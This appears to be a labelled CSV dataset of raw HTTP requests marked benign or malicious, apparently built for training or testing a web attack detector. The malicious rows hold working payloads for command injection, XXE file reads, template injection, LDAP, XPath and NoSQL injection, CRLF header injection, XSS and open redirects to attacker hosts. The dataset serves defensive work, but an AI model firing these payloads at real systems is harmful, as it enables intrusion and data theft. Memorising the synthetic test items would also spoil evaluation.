label,text
benign,"GET /blog/articles/list?tags=technology,ai,machine-learning&author=liam-johnson&published_after=2023-01-01&include_comments=false&sort=popularity_desc&page=4&per_page=10&language=en&region=eu HTTP/1.1
Host: my-personal-blog-site.info
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8"
malicious,"GET /maintenance/execute?command=uptime;%20tail%20-f%20/var/log/auth.log HTTP/1.1
Host: cloud-infra-monitoring.cloud
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.54
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://cloud-infra-monitoring.cloud/dashboard
X-Requested-With: FetchAPIClient"
malicious,"GET /go?target=data:text/html;base64,PHNjcmlwdD5hbGVydCgnUmVkaXJlY3RlZCEgWFNTJyk8L3NjcmlwdD4= HTTP/1.1
Host: api.session-authentication.io
User-Agent: curl/7.77.0
Accept: */*
Connection: keep-alive"
malicious,"POST /auth/redirect HTTP/1.1
Host: secure-login-hub.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Cache-Control: max-age=0
Content-Length: 58

{""continue_to"": ""https://ads.attacker-net.info/promo""}"
benign,"POST /register/new HTTP/1.1
Host: cloud-apps-hub.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 2125
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Connection: keep-alive

first_name=Jonathan&last_name=Kingston&email=jonathan.kingston%40mailservice.com&password=*********&confirm_password=*********&bio=I+am+a+technology+enthusiast+with+a+keen+interest+in+cloud+computing+and+distributed+systems.+With+several+years+of+experience+working+in+software+development+and+IT+infrastructure+management%2C+I+enjoy+exploring+new+tools+and+platforms+that+enhance+efficiency+and+performance.+In+my+free+time%2C+I+participate+in+local+tech+meetups+and+contribute+to+open-source+projects.+I+believe+in+continuous+learning+and+am+always+eager+to+collaborate+with+others+who+share+a+passion+for+innovation+and+problem-solving."
malicious,"POST /upload/processDocument HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Referer: https://dashboard.api.cloud-data-services.ai/uploader
Origin: https://dashboard.api.cloud-data-services.ai
Content-Type: multipart/form-data; boundary=----MyBoundary12345Abc
Content-Length: 410
Connection: keep-alive

------MyBoundary12345Abc
Content-Disposition: form-data; name=""description""

Configuration import for user request 90876
------MyBoundary12345Abc
Content-Disposition: form-data; name=""file""; filename=""config.xml""
Content-Type: application/xml

<?xml version=""1.0""?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///c:/windows/win.ini"">]>
<config>&xxe;</config>
------MyBoundary12345Abc--"
benign,"GET /news/tech-startup-raises-series-a HTTP/1.1
Host: digital-frontier-media.net
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive"
benign,"POST /user/profile/comment HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 109
Accept-Language: en-us
Accept-Encoding: br, gzip, deflate
Connection: keep-alive
Origin: https://my-personal-blog-site.info
Referer: https://my-personal-blog-site.info/blog/article/view/845

postId=845&user=sofia_jones&comment=VGhpcyBwb3N0IGhhcyBiZWVuIGlmZmVjdGl2ZWx5IGFwcHJlY2lhdGVkIGJ5IG15IGZvbGxvd2Vycy4="
benign,"GET /resource/load?path=assets/css/main.css HTTP/1.1
Host: media-streaming-hub.org
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/css,*/*;q=0.1
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"GET /api/v1/orders?customer_id=2345&status=shipped HTTP/1.1
Host: shopfast-cloudstore.io
Accept: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc123def456ghi789
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
Connection: keep-alive"
benign,"GET /resource/load?path=fonts/open-sans/regular.woff2 HTTP/1.1
Host: typography-cloud-service.biz
Accept: font/woff2,font/woff;q=0.9,*/*;q=0.8
Connection: keep-alive
Referer: https://typography-cloud-service.biz/assets/fonts
Accept-Language: de-DE,de;q=0.9,en-US;q=0.7,en;q=0.6
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15"
benign,"PUT /api/v1/users/8877/preferences HTTP/1.1
Host: portal-techworld.io
Authorization: Bearer v2sR8h3O1pX9qWMKnFUazyjStP5eBcgUm7ZnwyLHJ
Content-Type: application/xml
Accept: application/xml
DNT: 1
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.74 Mobile Safari/537.36
Content-Length: 126
Connection: keep-alive

<preferences><userId>8877</userId><notifications><email>true</email><sms>false</sms></notifications><theme>dark</theme></preferences>"
malicious,"GET /api/v3/items/search%0d%0aSet-Cookie:%20session=evil123%0d%0a%0d%0a<script>document.location='http://malicious.cloud'</script> HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: */*
Referer: https://dashboard.cloud-data-services.ai/app
Connection: close"
benign,"POST /api/v1/profile/update HTTP/1.1
Host: user-data-service.cloudapp.dev
Connection: keep-alive
Content-Type: application/json
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYnJpYW4ifQ.XrMeMHM6Jpx7rUGdyxCBRr8UQFgkFQJSsjgBti7FZpA
Origin: https://user-data-service.cloudapp.dev
Referer: https://user-data-service.cloudapp.dev/settings
Accept-Language: en-US,en;q=0.9
Content-Length: 109

{""displayName"":""Brian Thompson"",""preferences"":{""newsletter"":true,""timezone"":""America/Chicago"",""language"":""en-US""}}"
benign,"GET /openapi/swagger.json HTTP/1.1
Host: secure-docs-platform.org
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
DNT: 1"
benign,"GET /account/settings/profile HTTP/1.1
Host: secure-user-portal.net
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Cookie: user_prefs_b64=eyJ1c2VyTGFuZyI6ImVuIiwicmVkaXJlY3RTZXR0aW5ncyI6dHJ1ZX0=; auth_sid=Xg72m94nqQcF
User-Agent: curl/7.88.1"
malicious,"POST /login HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) CmdExec/1.0 $(echo vulnerable)
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

username=alice&password=verysecurepassword"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Content-Length: 162
Accept: application/json
User-Agent: Python-urllib/3.9

{""query"":""latest gadgets"",""filters"":{""promo"":""\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029""}}"
benign,"PUT /assets/theme_v3/img/banner-mobile.svg.base64 HTTP/1.1
Host: static-delivery-service.net
Content-Type: application/octet-stream
Content-Length: 78
Cookie: session_id=6e1b2a08d9d144299c7b72bf1cf2f945; lang=en-US
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Cache-Control: no-cache

PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnPg0KICA8Y2lyY2xlIGN4
PSIxMCIgY3k9IjEwIiByPSI4IiBmaWxsPSIjZmY4MDAwIi8+DQo8L3N2Zz4="
malicious,"GET /app/user/settings/%7B%7B%20self.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27id%27).read()%20%7D%7D HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.7
Cache-Control: no-cache
Pragma: no-cache
Connection: close"
benign,"GET /forums/development/javascript/tips-&-tricks HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Cache-Control: max-age=300"
malicious,"GET /directory/search?group=%2A%29%28memberUid%3Dbob%29%29%7C%28!(owner%3D*) HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/xml,application/xhtml+xml,text/html;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Connection: keep-alive"
malicious,"GET /members/ldap?dept=%2A%29%28givenName%3DBob%29%29%7C%28sn%3DJones%29 HTTP/1.1
Host: tech-collaboration-hub.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: br, gzip, deflate
Connection: keep-alive"
benign,"GET /v3/orders/3521/detail.xml HTTP/1.1
Host: secure-orders-cloud.biz
Accept: application/xml
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.validtokenstringhere
Accept-Language: en-US,en;q=0.9"
benign,"GET /sitemap-news.xml HTTP/1.1
Host: daily-mining-reporting.org
Accept: application/xml
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G990U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
DNT: 1
Connection: keep-alive"
malicious,"POST /portal/search/items HTTP/1.1
Host: news-aggregator-service.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/xml,application/xhtml+xml,text/html;q=0.9
Accept-Encoding: gzip, deflate, br
Content-Type: application/xml
Content-Length: 127
Cache-Control: max-age=0

<searchRequest>
  <term>' or count(//node()) > 0 or ''='</term>
  <category>news</category>
</searchRequest>"
benign,"PUT /api/data/item123 HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1
Content-Type: text/plain
Content-Length: 37
Cache-Control: no-cache
Pragma: no-cache
Connection: keep-alive

Entry update: corrected typo in paragraph."
benign,"PUT /api/orders/10329 HTTP/1.1
Host: ecommerce-backend.online-retail-store.biz
Authorization: Bearer Z7P9YNbGV41WsnEo6QKtvTiHZMFqXxKr8JPlc3wf
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-A107F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.94 Mobile Safari/537.36
Accept-Encoding: gzip
Accept-Language: en-US,en;q=0.9
Connection: close

{""orderId"":10329,""customerId"":527,""items"":[{""productId"":112,""quantity"":2},{""productId"":984,""quantity"":1}],""status"":""processing"",""shippingAddress"":{""line1"":""742 Evergreen Terrace"",""city"":""Springfield"",""state"":""OR"",""zip"":""97403""}}"
benign,"GET /api/v3/items/search?filter=active&sort=desc HTTP/1.1
Host: api.cloud-data-services.ai:5001
User-Agent: python-requests/2.31.0
Accept: application/json
Accept-Encoding: gzip, deflate
X-Forwarded-For: 203.0.113.195
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Connection: keep-alive"
benign,"GET /reports/monthly-summary?format=pdf HTTP/1.1
Host: example.com:8080
Accept: application/pdf
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/115.0
Connection: keep-alive
Pragma: no-cache
Accept-Language: en-GB,en;q=0.5"
malicious,"POST /api/v1/profile/update HTTP/1.1
Host: appdata.enterprise-cloud.io
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: application/json, text/plain, */*
Origin: https://appdata.enterprise-cloud.io
Content-Length: 94
Connection: keep-alive

userid=guest&perm=read&userid=superuser&perm=write&note=normal+update&note=%3Cscript%3Exss()%3C%2Fscript%3E"
benign,"POST /logout HTTP/1.1
Host: my-personal-blog-site.info
Connection: close
Content-Length: 0
Referer: https://my-personal-blog-site.info/welcome
Cookie: blog_sess=1234abcd5678ef9012345678abcd9012; visited=true
User-Agent: curl/7.85.0"
benign,"GET /static/fonts/icons.woff2 HTTP/1.1
Host: design-agency-portfolio.dev
Accept: font/woff2,application/font-woff2,*/*;q=0.8
If-None-Match: ""c879d51a""
Connection: keep-alive
Cache-Control: max-age=0
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept-Language: en-GB,en;q=0.9"
benign,"POST /upload/photos/batch HTTP/1.1
Host: media-archive.devops.ai
Connection: close
Content-Type: multipart/form-data; boundary=----MyCustomBoundary8
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Content-Length: 754

------MyCustomBoundary8
Content-Disposition: form-data; name=""files[]""; filename=""mountain_view.jpeg""
Content-Type: image/jpeg

<JPEG FILE DATA - omitted>
------MyCustomBoundary8
Content-Disposition: form-data; name=""files[]""; filename=""skyline.png""
Content-Type: image/png

<PNG FILE DATA - omitted>
------MyCustomBoundary8--"
benign,"POST /user/profile/picture/upload HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer e2c9f172-3564-44d3-9f6b-d8ca3e7328d3
Content-Type: application/json
Content-Length: 65
Idempotency-Key: 6dd98aa1-70c2-4f35-9c5f-7a4a494d56b9
X-Request-ID: 1f47e5bc-9a02-4e41-b48e-2efbe049c985
X-Client-Version: 1.16.4
Accept: application/json
Connection: keep-alive

{""userId"":1876,""imageUrl"":""https://cdn.my-personal-blog-site.info/uploads/pic_1876.png""}"
benign,"POST /app/notes/add HTTP/1.1
Host: enterprise-analytics.pro
User-Agent: curl/7.81.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 88
Accept: */*
X-Requested-With: XMLHttpRequest
Connection: keep-alive

note=Remember+to+review+how+DELETE+statements+affect+dependent+tables+in+the+production+environment."
benign,"PATCH /api/v1/settings HTTP/1.1
Host: management-portal.infra-corp.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15
Content-Type: application/json-patch+json
Accept: application/json
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.http.payload.signature
Content-Length: 72
Connection: keep-alive

[{""op"": ""replace"", ""path"": ""/notifications/email"", ""value"": false}]"
malicious,"POST /admin/api/update HTTP/1.1
Host: admin-control-panel.net
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Accept: application/json
Content-Length: 65

config=enabled%0aid%0awhoami%0als%20-la%20/tmp"
benign,"GET /docs/manuals/photography_basics_guide.pdf HTTP/1.1
Host: creative-mind-studio.net
Accept: application/pdf
Referer: https://creative-mind-studio.net/docs/manuals/
User-Agent: curl/7.88.1
Accept-Language: en-US,en;q=0.6
Connection: close"
benign,"GET /community/forum/threads?category=development&sort_by=latest&page=5 HTTP/1.1
Host: devtalkers-forum.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15
Accept: text/html
Referer: https://devtalkers-forum.net/community/
Cache-Control: max-age=0
Connection: keep-alive"
benign,"DELETE /v1/users/ax7f4e HTTP/1.1
Host: members-area.socialcircle.community
Authorization: Bearer MTIzNDU2Nzg5YWJjZGVmZ2hpamtsbQ==
If-Match: ""89a7f6e5""
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0
Accept: application/json, text/plain
Connection: keep-alive"
benign,"PATCH /members/48391/profile HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer Zx81hd7FunR342ksP02fJlNuTmdW3Vc2
Content-Type: application/json-patch+json
Accept: */*
User-Agent: curl/7.88.1
Content-Length: 73

[{""op"": ""replace"", ""path"": ""/bio"", ""value"": ""Passionate traveler and photographer.""}]"
benign,"GET /videos/education/python-basics-part-3 HTTP/1.1
Host: learnforfree.education
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.9
Referer: https://community.coding-hub-forums.org/thread/23452
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Connection: close"
malicious,"POST /member/settings/update HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Referer: https://api.cloud-data-services.ai/member/settings
Connection: close

username=user123&action=save&comment=review_ok&username=adminuser&action=delete&comment=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E"
malicious,"POST /member/login HTTP/1.1
Host: dev-analytics-platform.org
User-Agent: Wget/1.21.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 120
Connection: keep-alive

user=admin') and substring(substring(concat(//users/user[1]/password, '***'),1,5),5,1)='w'--&pass=irrelevant"
malicious,"GET /search?q=laptops HTTP/1.1
Host: techsupport-resource.org
User-Agent: Mozilla/5.0 ""><script>eval(atob('YWxlcnQoJ1dhdGNoIG91dCdzIGZvciAlMScp'))</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cache-Control: max-age=0
Connection: keep-alive"
benign,"POST /tools/snippets/upload HTTP/1.1
Host: tools-and-snippets.io
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.58 Mobile Safari/537.36
Content-Type: application/javascript
Content-Length: 52
Accept-Language: en-US,en;q=0.9
Cache-Control: max-age=0
Connection: keep-alive

(()=>{alert('Snippet uploaded successfully');})()"
benign,"GET /v2/profile/data HTTP/1.1
Host: client-api.social-network-cloud.org
Accept: application/json
X-Requested-With: XMLHttpRequest
Origin: https://social-network-cloud.org
Authorization: Bearer mno456pqr789stu012vwx345yzab678cd
Cache-Control: no-cache
User-Agent: python-requests/2.28.2
Accept-Language: en-US,en;q=0.9"
malicious,"POST /app/user/settings/update HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 98
Connection: keep-alive

username=guest&action=view&comment=safe_comment&username=admin&action=delete&comment=%3Cscript%3Exss()%3C%2Fscript%3E"
benign,"GET /store/products/search?category=home-garden&filter%5Bmaterial%5D=wood&sort_by=popularity_desc&page=1 HTTP/1.1
Host: garden-luxe-shop.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.9
Referer: https://garden-luxe-shop.biz/store/home
Connection: keep-alive"
benign,"GET /category/lifestyle/healthy-eating-trends HTTP/1.1
Host: dailywellnesscorner.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0
Accept: text/html
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Referer: https://dailywellnesscorner.com/category/lifestyle
Upgrade-Insecure-Requests: 1
Connection: keep-alive"
benign,"GET /blog/travel/hidden-gems-in-south-america HTTP/1.1
Host: wanderlust-journal.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en;q=0.8
Referer: https://wanderlust-journal.info/blog/travel/
Upgrade-Insecure-Requests: 1
Connection: close"
benign,"PUT /api/v1/accounts/6072/preferences HTTP/1.1
Host: my-personal-blog-site.info
Authorization: Bearer 246daf09c97498f019f3de0987f7e6b7
Content-Type: application/json
Accept: application/json
Origin: https://dashboard.my-personal-blog-site.info
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Content-Length: 63
Connection: close

{""displayName"":""Lina_T"",""subscribeNewsletter"":true,""showOnlineStatus"":false}"
malicious,"POST /api/v1/sessions/redirect HTTP/1.1
Host: online-retail-store.biz
User-Agent: curl/7.77.0
Accept: */*
Content-Type: application/json
Content-Length: 268
Cache-Control: max-age=0
Origin: https://online-retail-store.biz
Cookie: session=2c8d9f599102a1a378e4c12dbbffc04e

{""redirect_url"": ""/checkout%0d%0aContent-Type:%20text/html%0d%0aLocation:%20http://scam-online-retail.biz/deal%0d%0a%0d%0a<html><body>Redirecting please wait</body></html>""}"
benign,"GET /news/latest?search=SELECT%20best%20option%20FROM%20list HTTP/1.1
Host: global-info-network.xyz
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Referer: https://global-info-network.xyz/home
Connection: keep-alive"
malicious,"POST /api/v3/query/user HTTP/1.1
Host: data-insights-platform.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Content-Type: application/json
Accept: application/json
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Cookie: session_token=xyz987abc654

{""query"":{""$where"":""this.username=='admin' && this.password.startsWith('a') || sleep(5000)""}}"
benign,"PUT /data/backups/db_backup_04_22_2024.sql.b64 HTTP/1.1
Host: backup-api.cloud-repository.ai
Content-Type: application/octet-stream
Content-Length: 116
X-Requested-With: XMLHttpRequest
Authorization: ApiKey 9f2c88a7d603442fbb3528e074d895a2
User-Agent: curl/7.81.0
Accept: */*
Connection: close

U1FJLVBMQUFTRUxFIEFTREZETEFTIEFGSEJERkFOTCBERklIQU5GSDY0Cg=="
benign,"POST /register/new-user HTTP/1.1
Host: virtual-edu-portal.edu
Content-Type: application/x-www-form-urlencoded
Content-Length: 111
Referer: https://virtual-edu-portal.edu/register/new-user
Origin: https://virtual-edu-portal.edu
Cookie: eduportal_sid=cd146a975902fb183e0b2f6a
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept-Encoding: gzip, deflate
Connection: keep-alive

username=isabella.reed&email=isabella.reed%40edumail.org&password=Sunrise2023&password_confirm=Sunrise2023&terms_accepted=true"
benign,"POST /profile/update/preferences HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Accept: text/html,application/xhtml+xml
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Origin: https://my-personal-blog-site.info

subscribe_newsletter=yes&contact_method=phone&contact_method=email"
malicious,"PUT /blog/article/view HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: application/json
Content-Length: 53

{""filePath"":""C:\\inetpub\\wwwroot\\web.config""}"
benign,"GET /offers?ref=weekly_promo&utm_medium=email&utm_source=newsletters HTTP/1.1
Host: discount-deals-online.net
Connection: close
Accept: text/html
Accept-Language: en-US,en;q=0.8
Referer: https://discount-deals-online.net/home
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
benign,"OPTIONS /api/v3/orders/create HTTP/1.1
Host: api.online-retail-store.biz
Origin: https://client.marketplace-stats.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: authorization, content-type
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0
Accept-Encoding: deflate, gzip
Connection: keep-alive"
